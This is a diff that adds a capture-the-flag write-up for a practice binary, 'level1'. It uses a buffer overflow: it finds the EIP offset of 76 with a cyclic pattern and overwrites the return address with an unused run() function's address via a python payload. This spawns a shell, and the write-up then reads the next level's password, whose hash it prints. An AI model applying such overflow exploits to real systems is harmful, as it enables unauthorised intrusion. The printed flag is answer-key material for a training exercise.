@@ -1,0 +1,63 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗          ██╗
+██║     ██╔════╝██║   ██║██╔════╝██║         ███║
+██║     █████╗  ██║   ██║█████╗  ██║         ╚██║
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║          ██║
+███████╗███████╗ ╚████╔╝ ███████╗███████╗     ██║
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝     ╚═╝
+                                               
+
+objdump -d level1
+
+There are two functions: <main> and <run>.
+The <run> function is never called. 
+This function is making a call to <system>.
+We can suppose that this function is running the new shell. 
+So we just have to make the program calls this function.
+
+Let's use the BufferOverflow exploit:
+
+Start by creating a string that will help us to find the offset.
+Go to: http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+
+-> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+gdb lebel1
+
+run
+
+Enter the offset string:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+
+Perfect ! This is what we expected. The EIP has segfaulted somewhere in our string.
+
+Go back to the website and check this address (0x63413563) to find the offset:
+-> 76
+
+Now, get the address of the "run" function:
+
+disas run
+
+-> 0x08048444
+
+Reverse it (Little Endian):
+
+44 84 04 08
+
+Write 76 random characters to pass the offset, then write the address of the run function.
+
+python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/file
+
+cat /tmp/file - | ./level1
+
+(Don't forget the '-' , to keep the hand on the shell)
+
+cd ../level2 && cat .pass
+
+|══════════════════════════════════════════════════════════════════|
+| 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77 |
+|══════════════════════════════════════════════════════════════════|
+
